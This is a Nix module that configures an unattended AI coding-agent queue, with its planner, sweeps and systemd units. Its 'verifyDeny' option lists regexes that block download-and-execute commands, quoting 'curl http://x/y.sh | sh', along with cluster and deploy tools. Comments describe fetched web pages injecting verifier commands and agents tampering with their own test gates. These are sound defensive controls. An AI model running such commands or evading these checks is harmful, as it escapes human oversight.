{
  config,
  lib,
  pkgs,
  ...
}:
let
  cfg = config.modules.herdr;
  format = pkgs.formats.toml { };

  # The driver is a plain portable bash script with @placeholders@ for the values
  # this module owns. Baked-in defaults keep `agent-queue` runnable with no env,
  # while every one of them stays overridable at call time (see its --help).
  queueScript = pkgs.replaceVarsWith {
    src = ./agent-queue;
    dir = "bin";
    isExecutable = true;
    replacements = {
      herdrBin = "${cfg.package}/bin/herdr";
      defaultBase = cfg.queue.defaultBase;
      defaultTimeoutMs = toString cfg.queue.defaultTimeoutMs;
      stallAfterSecs = toString cfg.queue.stallAfterSecs;
      verifyTimeoutMs = toString cfg.queue.verifyTimeoutMs;
      defaultRetries = toString cfg.queue.defaultRetries;
      defaultModel = cfg.queue.defaultModel;
      ntfyTopic = cfg.queue.ntfyTopic;
      ntfyTopicFile = cfg.queue.ntfyTopicFile;
      verifyDenyFile = "${verifyDenyFile}";
      approveProject = lib.boolToString cfg.queue.approveProject;
      # "1"/"0", NOT lib.boolToString: the driver tests this arithmetically
      # (`((AGENT_COMMITS))`), and `(( ))` on the *string* "true" makes bash resolve a
      # variable named `true` -- which is unset, so `set -u` aborts the run on the first
      # task. Measured: every sweep tick died at the prompt step until this was fixed.
      # Same reason `intakeStaging` is "1"/"0"; `approveProject` gets away with
      # boolToString only because it is compared as a string.
      agentCommits = if cfg.queue.agentCommits then "1" else "0";
      # "1"/"0" for the same reason as agentCommits: the driver tests it with `(( ))`.
      allowGateMod = if cfg.queue.gateIntegrity then "0" else "1";
    };
  };

  # One regex per line, as a store path rather than an inlined blob: the driver
  # reads it with mapfile, and QUEUE_VERIFY_DENY_FILE replaces it wholesale.
  verifyDenyFile = pkgs.writeText "agent-queue-verify-deny" (
    lib.concatStringsSep "\n" cfg.queue.verifyDeny + "\n"
  );

  # A closed PATH: the driver shells out to git/jq/curl and to herdr itself, and
  # it is meant to survive being called from a pane, a systemd unit or cron.
  queuePackage = pkgs.runCommand "agent-queue" { nativeBuildInputs = [ pkgs.makeWrapper ]; } ''
    mkdir -p "$out/bin"
    makeWrapper "${queueScript}/bin/agent-queue" "$out/bin/agent-queue" \
      --prefix PATH : "${lib.makeBinPath [
        cfg.package
        pkgs.bash
        pkgs.coreutils
        pkgs.findutils
        pkgs.gawk
        pkgs.gnugrep
        pkgs.gnused
        pkgs.git
        pkgs.jq
        pkgs.curl
        pkgs.util-linux
      ]}"
  '';
  queueSweepScript = pkgs.replaceVarsWith {
    src = ./agent-queue-sweep;
    dir = "bin";
    isExecutable = true;
    replacements = {
      agentQueueBin = "${queuePackage}/bin/agent-queue";
      sweepExclude = cfg.queue.watch.exclude;
    };
  };

  queueSweepPackage = pkgs.runCommand "agent-queue-sweep" { nativeBuildInputs = [ pkgs.makeWrapper ]; } ''
    mkdir -p "$out/bin"
    makeWrapper "${queueSweepScript}/bin/agent-queue-sweep" "$out/bin/agent-queue-sweep" \
      --prefix PATH : "${lib.makeBinPath [ pkgs.coreutils pkgs.git ]}"
  '';

  intakeScript = pkgs.replaceVarsWith {
    src = ./agent-queue-intake;
    dir = "bin";
    isExecutable = true;
    replacements = {
      vikunjaUrl = cfg.queue.intake.vikunjaUrl;
      vikunjaTokenFile = cfg.queue.intake.tokenFile;
      intakeRoot = cfg.queue.intake.root;
      intakeModel = cfg.queue.intake.model;
      plannerTools = cfg.queue.intake.plannerTools;
      intakePlannerTimeout = toString cfg.queue.intake.plannerTimeoutSecs;
      intakeRepairs = toString cfg.queue.intake.oracleRepairs;
      intakeStaging = if cfg.queue.intake.staging then "1" else "0";
      projectMap = lib.concatStringsSep ";"
        (lib.mapAttrsToList (k: v: "${k}=${v}") cfg.queue.intake.projectMap);
      ntfyTopic = cfg.queue.ntfyTopic;
      ntfyTopicFile = cfg.queue.ntfyTopicFile;
      verifyDenyFile = "${verifyDenyFile}";
    };
  };

  # `pi` must be on PATH for the planner, and the planner is the only part of this
  # rig that runs pi outside a herdr pane -- hence the separate wrapper.
  intakePackage = pkgs.runCommand "agent-queue-intake" { nativeBuildInputs = [ pkgs.makeWrapper ]; } ''
    mkdir -p "$out/bin"
    makeWrapper "${intakeScript}/bin/agent-queue-intake" "$out/bin/agent-queue-intake" \
      --prefix PATH : "${lib.makeBinPath [
        pkgs.bash
        pkgs.coreutils
        pkgs.findutils
        pkgs.gawk
        pkgs.gnugrep
        pkgs.gnused
        pkgs.git
        pkgs.jq
        pkgs.curl
        pkgs.util-linux
      ]}:${lib.makeBinPath [ pkgs.pi-coding-agent ]}"
  '';

  # One pair of systemd user units per watched repo: `agent-queue-homelab.path`
  # watches <repo>/tasks and starts `agent-queue-homelab.service`, which is just
  # `agent-queue` with a long lock wait. There is no second scheduler, no polling
  # daemon and no second copy of the queue's logic -- the unit is the same command
  # you would type, and everything it refuses to do it still refuses to do.
  repoUnitName = p:
    "agent-queue-" + builtins.substring 0 40
      (builtins.replaceStrings [ "/" "." " " "@" ] [ "-" "-" "-" "-" ] (baseNameOf p));
  # keyed by unit name -> repo path, e.g. "agent-queue-homelab" -> /home/elia/builds/homelab
  watchRepos = lib.listToAttrs (map (p: { name = repoUnitName p; value = p; })
    (lib.optionals (cfg.queue.watch.enable && cfg.enable) cfg.queue.watch.paths));

  watchUnitArgs = builtins.concatStringsSep " " (
    [ "--wait-lock" (toString cfg.queue.watch.lockWaitSecs) ] ++ cfg.queue.watch.args
  );

  # Sweep roots -> one timer + oneshot per root, e.g. "agent-queue-sweep-builds".
  # This is what makes "every repo under ~/builds" work without the flake knowing
  # which repos exist today.
  sweepUnitName = p:
    "agent-queue-sweep-" + builtins.substring 0 40
      (builtins.replaceStrings [ "/" "." " " "@" ] [ "-" "-" "-" "-" ] (baseNameOf p));
  sweepRoots = lib.listToAttrs (map (p: { name = sweepUnitName p; value = p; })
    (lib.optionals (cfg.queue.watch.enable && cfg.enable) cfg.queue.watch.roots));
in
{
  options.modules.herdr = {
    enable = lib.mkEnableOption "herdr";

    package = lib.mkPackageOption pkgs "herdr" { };

    settings = lib.mkOption {
      type = format.type;
      description = ''
        Contents of {file}`~/.config/herdr/config.toml`. Keys mirror
        `herdr --default-config`; run `herdr config check` after a switch to
        validate, and `herdr server reload-config` to apply to a live server.
      '';
      default = {
        update = {
          # Two defaults worth flipping on a NixOS box. `version_check` invites
          # `herdr update`, which would install a mutable binary over a store
          # path it cannot own. `manifest_check` downloads the remote
          # agent-detection manifests (regular expressions that decide when an
          # agent is "blocked") without a pin in between; fetch them
          # deliberately with `herdr server update-agent-manifests` instead.
          version_check = false;
          manifest_check = false;
        };
        server = {
          # The virtual terminal size used while no client is attached -- which
          # is exactly when agent-queue is creating panes and reading output.
          headless_cols = 160;
          headless_rows = 50;
        };
        ui = {
          # Distinguish blocked / working / done by glyph shape, not only hue.
          status_indicators = "symbols";
          toast = {
            # herdr's own default is "off", which is why an unattended run can
            # finish a whole queue without a single toast. Every delivery mode
            # is best-effort through an *attached* client, so this only helps
            # when you are watching: reach an unattended queue through
            # modules.herdr.queue.ntfyTopic instead.
            delivery = "herdr";
          };
        };
        worktrees.directory = "~/.herdr/worktrees";
      };
    };

    piIntegration = {
      enable = lib.mkEnableOption ''
        the bundled herdr pi integration (reports agent state to herdr instead
        of letting it read the screen)'';
    };

    queue = {
      enable = lib.mkEnableOption "the agent-queue sequential task driver";

      defaultBase = lib.mkOption {
        type = lib.types.str;
        default = "main";
        description = "Branch a task worktree forks when the task omits `base:`.";
      };

      defaultModel = lib.mkOption {
        type = lib.types.str;
        default = "";
        description = ''
          pi model passed to every task that omits `model:` (empty = pi's own
          default). Set it per host: an unattended queue should not inherit
          whichever model happens to lead the provider list, and one inference
          unit serves them all.
        '';
      };

      defaultTimeoutMs = lib.mkOption {
        type = lib.types.int;
        default = 21600000;   # 6h
        description = ''
          Per-turn prompt timeout in milliseconds. Long on purpose: a task that builds
          a NixOS system, regenerates a lockfile or runs a real test suite spends most
          of its time inside one tool call, and cutting that at 15 minutes loses the
          work and reports a verdict nobody earned. herdr caps `agent start` readiness
          at 300s but places no cap on `agent prompt --timeout`. Pair it with
          `stallAfterSecs` if you want long patience without long silence.
        '';
      };

      stallAfterSecs = lib.mkOption {
        type = lib.types.int;
        default = 0;
        description = ''
          Stop waiting on an agent whose pane has produced no output for this many
          seconds (0 = never, i.e. trust `defaultTimeoutMs` alone). The trade-off is
          one-sided: a silent tool call -- a build that buffers output, a retry that
          sleeps, a model thinking without streaming -- looks exactly like a hang. When
          it fires the turn is not cancelled and nothing is destroyed: you get a
          notification and the task is left for a human.
        '';
      };

      verifyTimeoutMs = lib.mkOption {
        type = lib.types.int;
        default = 21600000;   # 6h
        description = ''
          How long a verifier may run before the driver gives up on it. A verifier that
          compiles the project is allowed to take hours; one that hangs looks the same,
          so the run is reported as needing a human rather than guessed at.
        '';
      };

      defaultRetries = lib.mkOption {
        type = lib.types.int;
        default = 2;
        description = "Verifier-gated retries per task when the task omits `max_retries:`.";
      };

      ntfyTopic = lib.mkOption {
        type = lib.types.str;
        default = "";
        description = ''
          Bare ntfy topic URL used as a mirror of herdr's own notifications
          (empty disables). herdr's `notification show` is the primary channel;
          the driver warns when neither delivered. Leave this empty unless the
          URL is not a secret -- see {option}`modules.herdr.queue.ntfyTopicFile`.
        '';
      };

      ntfyTopicFile = lib.mkOption {
        type = lib.types.str;
        default = "${config.home.homeDirectory}/.config/herdr/ntfy-topic";
        description = ''
          File the driver reads the ntfy URL from when neither
          {env}`NTFY_TOPIC` nor {option}`modules.herdr.queue.ntfyTopic` is set.

          On a tailnet-only ntfy with no auth (see `homelab/base/ntfy`), the
          topic name is the only thing gating who can publish to your phone, so
          it is kept out of this public repository: create the file once per
          machine, e.g.
          `install -Dm600 /dev/null ~/.config/herdr/ntfy-topic` and write
          `https://ntfy.tail2f38ea.ts.net/<unguessable-topic>` into it.
        '';
      };

      verifyDeny = lib.mkOption {
        type = lib.types.listOf lib.types.str;
        default = [
          # Anything that can pull code from somewhere else and run it. This is not
          # about network politeness: the verifier is executed by the red-check and
          # later by the queue, and `curl http://x/y.sh | sh` matched nothing here
          # until it existed -- once the planner can browse, a fetched page can be
          # the author of a `verify:` line, which makes this the last line of defence.
          ''(^|[;&|[:space:]])(curl|wget|fetch)([[:space:]]|$)''
          ''(^|[;&|[:space:]])(sh|bash|zsh|dash)[[:space:]]+-[A-Za-z]*c([[:space:]]|$)''
          ''(^|[;&|[:space:]])(eval|python[0-9]?[[:space:]]+-c|perl[[:space:]]+-e|ruby[[:space:]]+-e|node[[:space:]]+-e)([[:space:]]|$)''
          ''(^|[;&|[:space:]])(npm|pnpm|yarn|bun|pip|pip3|uv|cargo|go)[[:space:]]+(install|add|i|get)([[:space:]]|$)''
          ''(^|[;&|[:space:]])docker([[:space:]]+(run|exec|build)([[:space:]]|$))''
          ''(^|[;&|[:space:]])kubectl([[:space:]]|$)''
          ''(^|[;&|[:space:]])argocd([[:space:]]|$)''
          ''(^|[;&|[:space:]])helm([[:space:]]+(install|upgrade|apply|rollback)([[:space:]]|$))''
          ''(^|[;&|[:space:]])terraform([[:space:]]+apply([[:space:]]|$))''
          # `nixos-rebuild` alone defaults to switch, and the mutating verb can
          # sit after --flake/--option, so both shapes are covered while plain
          # `build` / `dry-build` / `build-vm` are not.
          ''(^|[;&|[:space:]])nixos-rebuild([[:space:]]*$|[[:space:]][^&;|]*(switch|boot|test|appimage)([[:space:]]|&|$))''
          ''(^|[;&|[:space:]])home-manager([^&;|]*[[:space:]])?switch([[:space:]]|$)''
          ''(^|[;&|[:space:]])git([[:space:]]+(push|reset|clean|rebase)([[:space:]]|$))''
          ''(^|[;&|[:space:]])(nixos-anywhere|ansible|kubectl-(port-forward|exec|cp|delete))''
        ];
        description = ''
          Regular expressions a task's `verify:` command must not match. A
          worktree bounds the repository, not the cluster: a verifier that can
          reach a live control plane escapes the isolation that makes running
          without permission prompts defensible. `agent-queue` refuses such a
          task before sending any prompt; `--allow-verify <pat>` overrides a
          single command, {env}`QUEUE_VERIFY_DENY_FILE` replaces the list.

          The test is *mutates something outside the worktree*, not *touches the
          deploy toolchain*: `nixos-rebuild switch|boot|test` is refused, while
          `nixos-rebuild build`, `nix flake check --no-build` and `nix eval` are
          allowed, because they only evaluate and build. That is what makes
          verifiers usable in this repository -- see the README's table of weak
          but honest oracles. Building is not free (store space, CPU) but it is
          not irreversible.
        '';
      };

      agentCommits = lib.mkOption {
        type = lib.types.bool;
        default = true;
        description = ''
          Make the branch hold the work. Every prompt the queue sends (first attempt
          and every retry) ends with a commit contract telling the agent to commit on
          the current branch and leave the tree clean, and whatever the agent still
          holds uncommitted is committed by the queue afterwards -- on red runs too,
          because work on a red branch is work worth keeping.

          Commits are made with the ambient git identity, the same one the agent
          already edits and stages with, so this neither adds nor removes a signature:
          provenance lives in the `Agent-run: <run-id>` trailer instead. Verified on
          this machine: no `commit.gpgsign` anywhere and no hooks, which is what makes
          an unattended `git commit` incapable of failing on a keyring or a PIN. If you
          turn on commit signing later with a smartcard-backed `gpg-agent`, unattended
          commits fail in exactly the way README "Nobody has to be logged in" warns
          about -- set `queue.agentCommits = false` with it.

          Turn off with `--no-commits` for a single run; `write_artifact` then reports
          the dirty tree under `## uncommitted` as before.
        '';
      };

      gateIntegrity = lib.mkOption {
        type = lib.types.bool;
        default = true;
        description = ''
          Compare the working-tree content of the files a verifier judges -- its
          `gates` -- with the same paths at the task's base revision, and report
          `gate tampered` instead of green when they differ or when the comparison
          could not decide. The verifier's exit code stays the oracle; this is only an
          additional veto on *reporting* green, because a verifier that reads files the
          agent may edit is judging the suspect's own evidence.

          Turn off per run with `--allow-gate-self-modification`, or permanently here,
          for a task whose whole point is to change a test. `queue.agentCommits` is
          unaffected. See README "Gate integrity" for what it does and does not catch.
        '';
      };

      approveProject = lib.mkOption {
        type = lib.types.bool;
        default = false;
        description = ''
          Pass pi's {option}`--approve` when starting each agent, trusting
          project-local files (AGENTS.md, project settings) in the worktree.
          Left off by default: an unattended run should not silently widen trust
          to whatever a branch introduces. When it is off, a first-run trust
          prompt surfaces as a `blocked` agent and the queue notifies instead of
          hanging.
        '';
      };

      watch = lib.mkOption {
        type = lib.types.submodule {
          options = {
            enable = lib.mkEnableOption ''automatic `agent-queue` runs when task files appear'';

            paths = lib.mkOption {
              type = lib.types.listOf lib.types.path;
              default = [ ];
              description = ''
                Repository roots to watch. Each gets a systemd user path unit on
                `<repo>/tasks` that starts one queued batch when something in that
                directory changes. The unit runs the same `agent-queue` you would
                type, so every property is unchanged: serial, one worktree per task,
                verifier-gated, nothing merged, and a refused verifier still refuses.

                Write-capable means runnable: anything that can write a file into one
                of these directories can start an agent on this machine.
              '';
            };

            args = lib.mkOption {
              type = lib.types.listOf lib.types.str;
              default = [ "--drain" "--allow-empty" ];
              description = ''
                Extra arguments for the triggered run. `--drain` matters for unattended
                use: a file saved while a batch is already running would otherwise be
                picked up only on the next change.
              '';
            };

            roots = lib.mkOption {
              type = lib.types.listOf lib.types.path;
              default = [ ];
              description = ''
                Parent directories to sweep, e.g. {file}`~/builds`. Each gets one
                systemd user timer that runs `agent-queue-sweep` over every
                git repository under it that has a `tasks/` directory with a task
                whose branch does not exist yet. Unlike {option}`paths`, a root
                covers repositories created after the switch, which is the point:
                the cost is that a task is picked up within
                {option}`modules.herdr.queue.watch.intervalSecs` rather than instantly.
              '';
            };

            exclude = lib.mkOption {
              type = lib.types.str;
              default = "";
              example = "/builds/(scratch|vendor)/";
              description = ''
                Regular expression matched against the repository path; matches are
                skipped by sweeps. Empty matches nothing. Only affects sweeping,
                not {option}`paths`.
              '';
            };

            intervalSecs = lib.mkOption {
              type = lib.types.int;
              default = 120;
              description = ''
                How often a sweep root is walked. Cheap: a repository with nothing
                pending is never entered, so the cost is one `find` plus a branch
                lookup per task file.
              '';
            };

            startDelaySecs = lib.mkOption {
              type = lib.types.int;
              default = 90;
              description = ''
                Delay after boot before the first sweep, so the herdr user service
                has had a chance to come up and the first run is not racing it.
              '';
            };

            lockWaitSecs = lib.mkOption {
              type = lib.types.int;
              default = 21600;
              description = ''
                How long a triggered run waits for the per-repo run lock before giving
                up. Long on purpose: a batch that starts while three tasks are already
                running should queue, not die -- it re-scans the whole directory when
                it gets the lock, so it costs nothing but time.
              '';
            };
          };
        };
        default = { };
        description = "Unattended triggering of the queue. Off by default.";
      };
      intake = lib.mkOption {
        type = lib.types.submodule {
          options = {
            enable = lib.mkEnableOption ''Vikunja -> task-file intake planning'';

            vikunjaUrl = lib.mkOption {
              type = lib.types.str;
              default = "https://vikunja.tail2f38ea.ts.net";
              description = "Base URL of the Vikunja instance (no trailing slash).";
            };

            tokenFile = lib.mkOption {
              type = lib.types.str;
              default = "${config.home.homeDirectory}/.config/herdr/vikunja-token";
              description = ''
                File holding a Vikunja API token (Settings -> API Tokens), passed
                as `Authorization: Bearer`. Mode 600, kept out of this repository:
                the token grants write access to your task tracker.
              '';
            };

            root = lib.mkOption {
              type = lib.types.path;
              default =
                if cfg.queue.watch.roots != [ ]
                then builtins.head cfg.queue.watch.roots
                else config.home.homeDirectory;
              description = ''
                Parent directory a task's `repo:` line is resolved against. Repos
                outside it are rejected, which is what stops a task tracker entry
                from pointing an agent at an arbitrary path.
              '';
            };

            model = lib.mkOption {
              type = lib.types.str;
              default = "llhalo/qwen3.8-flash-next";
              description = ''
                Planner model, given as `provider/id`. The bare id is NOT enough
                for `pi --print`: measured on this machine, `--model
                qwen3.8-flash-next` exits 0 having printed nothing, while
                `--model llhalo/qwen3.8-flash-next` answers. A silently empty
                proposal is exactly the failure this option exists to avoid.
              '';
            };

            plannerTimeoutSecs = lib.mkOption {
              type = lib.types.int;
              default = 21600;   # 6h
              description = ''
                Wall-clock limit for one planning turn. Drafting takes a couple of
                minutes; the hours are so a planner that is genuinely researching does
                not get cut off. A wedged one holds only the intake lock, never the
                coder queue.
              '';
            };

            oracleRepairs = lib.mkOption {
              type = lib.types.int;
              default = 1;
              description = ''
                How many times a planner-authored `verify:` is sent back for a
                replacement when it is refused or fails to run, before the task is
                rejected and pushed at you. Each repair is one cheap turn whose prompt
                carries the exact reason -- the matched deny rule, the 127 line, the
                usage error -- which is the loop intake never had: refusals used to end
                the task until a human edited Vikunja.

                Only `planner`-sourced verifiers are repaired. A `verify:` written by a
                human is never rewritten -- intake already forces that line back in when
                the planner edits it, so silently "fixing" it would be worse than the
                refusal. `0` restores the old behaviour.
              '';
            };

            plannerTools = lib.mkOption {
              type = lib.types.str;
              default = "read,mcp__k8s_ddg_search__search,mcp__k8s_ddg_search__fetch_content";
              description = ''
                Comma-separated tool allowlist for the planner, passed to
                {command}`pi --tools`.

                The default gives the planner the repository and the web. Lookup is
                what makes a draft usable -- whether a binary is really called
                `kubeconform`, whether a flag still exists -- and it was verified to
                work under `--offline` (which only stops pi refreshing catalogs).
                What is deliberately absent is `bash` and `write`: no shell means
                `kubectl`, `git push` and download-and-execute stay off the table
                while it reasons, and no write tool stops a browsing agent from
                simply doing the task it was asked to describe.

                `pi` does not validate this list, so a typo silently drops a tool --
                check `journalctl --user -u agent-queue-intake` after changing it.
              '';
            };

            staging = lib.mkOption {
              type = lib.types.bool;
              default = false;
              description = ''
                Write drafts to `<repo>/tasks/proposed/` (which the queue never
                reads) instead of straight into `tasks/`.

                Off by default: a draft is queued as soon as it passes the two
                automated gates -- the verifier deny list and the red-check that the
                verifier is false on an untouched base. The human review point is the
                branch the run leaves behind, not a file move, because reviewing every
                draft is what people stop doing after a week and then the staging
                directory is just where work goes to die.

                Turn it on for repositories where a wrong brief is expensive.
              '';
            };

            projectMap = lib.mkOption {
              type = lib.types.attrsOf lib.types.str;
              default = { };
              example = { "Home Lab" = "homelab"; dotfiles = "dotfiles"; };
              description = ''
                Vikunja project title -> repository directory under
                {option}`modules.herdr.queue.intake.root`, used only when a task has no
                `repo:` line.

                Routing is deliberately never a model decision: a task states its
                repository, or its project says, or intake stops and asks. Keyed by
                name rather than id so it survives the database being restored.
              '';
            };

            intervalSecs = lib.mkOption {
              type = lib.types.int;
              default = 600;
              description = "How often to poll Vikunja. Polling, not webhooks: the instance is behind a tailnet ingress.";
            };

            startDelaySecs = lib.mkOption {
              type = lib.types.int;
              default = 180;
              description = "Delay after boot before the first intake run.";
            };
          };
        };
        default = { };
        description = "Turn labelled Vikunja tasks into proposed task files. Off by default.";
      };

    };

    server = {
      startOnLogin = lib.mkOption {
        type = lib.types.bool;
        default = false;
        description = ''
          Run `herdr server` as a user service at login so panes and agents
          survive logout/reboot. Off by default: starting `herdr` yourself
          already spawns the server, and the unit restarts on failure if it
          finds one already running.
        '';
      };
    };
  };

  config = lib.mkIf cfg.enable {
    assertions = [
      {
        assertion = cfg.queue.enable -> cfg.piIntegration.enable;
        message = "modules.herdr.queue.enable needs modules.herdr.piIntegration.enable: a queue that classifies pi from the screen mistakes idle for done.";
      }
      {
        assertion = cfg.queue.watch.enable -> cfg.queue.enable;
        message = "modules.herdr.queue.watch.enable needs modules.herdr.queue.enable.";
      }
      {
        assertion = cfg.queue.watch.enable -> (cfg.queue.watch.paths != [ ] || cfg.queue.watch.roots != [ ]);
        message = "modules.herdr.queue.watch.enable needs modules.herdr.queue.watch.paths and/or .roots.";
      }
      {
        assertion = cfg.queue.watch.enable -> (builtins.length (lib.attrNames watchRepos)) == (builtins.length cfg.queue.watch.paths);
        message = "Two watched repositories produce the same unit name (" + lib.concatStringsSep ", " (lib.attrNames watchRepos) + "): their directory names must differ.";
      }
      {
        assertion = cfg.queue.watch.enable -> (builtins.length (lib.attrNames sweepRoots)) == (builtins.length cfg.queue.watch.roots);
        message = "Two watched sweep roots produce the same unit name (" + lib.concatStringsSep ", " (lib.attrNames sweepRoots) + "): their directory names must differ.";
      }
      {
        assertion = cfg.queue.intake.enable -> cfg.queue.enable;
        message = "modules.herdr.queue.intake.enable needs modules.herdr.queue.enable: intake only feeds that queue.";
      }
    ];

    warnings =
      lib.optionals (cfg.queue.watch.enable && !cfg.server.startOnLogin) [
        "modules.herdr.queue.watch is on but modules.herdr.server.startOnLogin is off: a trigger that fires with no herdr server running fails (it pushes a failure notification, then does nothing)."
      ]
      ++ lib.optionals (cfg.piIntegration.enable && !config.modules.pi-coding-agent.enable) [
        "modules.herdr.piIntegration.enable is on but modules.pi-coding-agent.enable is off: herdr only installs the pi extension if ~/.pi/agent already exists."
      ];

    home.packages = [ cfg.package ]
      ++ lib.optionals cfg.queue.enable [ queuePackage queueSweepPackage ]
      ++ lib.optionals cfg.queue.intake.enable [ intakePackage ];

    xdg.configFile."herdr/config.toml".source = format.generate "herdr-config.toml" cfg.settings;

    # herdr ships the pi extension inside its own binary and writes it to
    # ~/.pi/agent/extensions/herdr-agent-state.ts. That file must match the
    # installed herdr, so it is generated by the binary rather than vendored
    # here -- but running the installer once, by hand, is precisely how it goes
    # missing after a rebuild or on a second machine and state detection quietly
    # degrades to screen reading. Hence an idempotent activation step.
    home.activation.herdrPiIntegration = lib.hm.dag.entryAfter [ "writeBoundary" ] (
      lib.optionalString cfg.piIntegration.enable ''
        if [ -d "$HOME/.pi/agent" ]; then
          if ! ${cfg.package}/bin/herdr integration install pi >/dev/null 2>&1; then
            echo "warning: herdr could not install the pi integration into ~/.pi/agent/extensions" >&2
          fi
        fi
      ''
    );

    # One assignment for the whole attrset (mixing `services.foo =` with
    # `services =` is a duplicate-attribute error in the module literal).
    systemd.user.services = lib.mkMerge [
      (lib.mkIf cfg.server.startOnLogin {
        herdr-server = {
          Unit = {
            Description = "herdr persistent server (owns agent terminals)";
            PartOf = [ "default.target" ];
          };
          Service = {
            ExecStart = "${cfg.package}/bin/herdr server";
            Restart = "on-failure";
            RestartSec = 5;
          };
          Install.WantedBy = [ "default.target" ];
        };
      })
      (lib.genAttrs (lib.attrNames watchRepos) (slug: {
        Unit.Description = "agent-queue: run queued tasks in ${toString watchRepos.${slug}}";
        Service = {
          Type = "oneshot";
          WorkingDirectory = toString watchRepos.${slug};
          ExecStart = "${queuePackage}/bin/agent-queue ${watchUnitArgs}";
          # Do NOT let the manager's default start timeout (90s, or
          # ManagerDefaultTimeoutStartSec on newer systemd) SIGTERM a batch that is
          # mid-task on the GPU: a queued run ends when the queue ends.
          TimeoutStartSec = "infinity";
          # Exit 1 is "not everything is green", i.e. the honest outcome of a real
          # verifier, not a crash. Only exit 2 (preflight) reads as a failed unit.
          SuccessExitStatus = "0 1";
        };
      }))
      (lib.genAttrs (lib.attrNames sweepRoots) (unit: {
        Unit.Description = "agent-queue: sweep ${toString sweepRoots.${unit}} for repos with pending tasks";
        Service = {
          Type = "oneshot";
          ExecStart = "${queueSweepPackage}/bin/agent-queue-sweep ${toString sweepRoots.${unit}}";
          TimeoutStartSec = "infinity";
          SuccessExitStatus = "0 1";
        };
      }))
      (lib.mkIf cfg.queue.intake.enable {
        agent-queue-intake = {
          Unit.Description = "agent-queue intake: plan labelled Vikunja tasks into task files";
          Service = {
            Type = "oneshot";
            ExecStart = "${intakePackage}/bin/agent-queue-intake";
            # A planning turn plus a red-check can outlast any default timeout, and
            # cutting one mid-plan loses the work and leaves the label unset.
            TimeoutStartSec = "infinity";
            SuccessExitStatus = "0 1";
          };
        };
      })
    ];

    systemd.user.timers = lib.mkMerge [
      (lib.genAttrs (lib.attrNames sweepRoots) (unit: {
        Unit.Description = "Periodic agent-queue sweep of ${toString sweepRoots.${unit}}";
        Timer = {
          OnBootSec = "${toString cfg.queue.watch.startDelaySecs}s";
          OnUnitActiveSec = "${toString cfg.queue.watch.intervalSecs}s";
          RandomizedDelaySec = "30s";
          Persistent = true;
        };
        Install.WantedBy = [ "timers.target" ];
      }))
      (lib.mkIf cfg.queue.intake.enable {
        agent-queue-intake = {
          Unit.Description = "Poll Vikunja for tasks to plan";
          Timer = {
            OnBootSec = "${toString cfg.queue.intake.startDelaySecs}s";
            OnUnitActiveSec = "${toString cfg.queue.intake.intervalSecs}s";
            RandomizedDelaySec = "45s";
          };
          Install.WantedBy = [ "timers.target" ];
        };
      })
    ];

    systemd.user.paths = lib.genAttrs (lib.attrNames watchRepos) (slug: {
      Unit.Description = "Watch ${toString watchRepos.${slug}}/tasks for new agent tasks";
      Path = {
        # A repo with no tasks/ yet simply never fires; creating the directory is
        # itself a change and starts the first batch.
        PathChanged = "${toString watchRepos.${slug}}/tasks";
        Unit = "${slug}.service";
      };
      Install.WantedBy = [ "default.target" ];
    });
  };
}
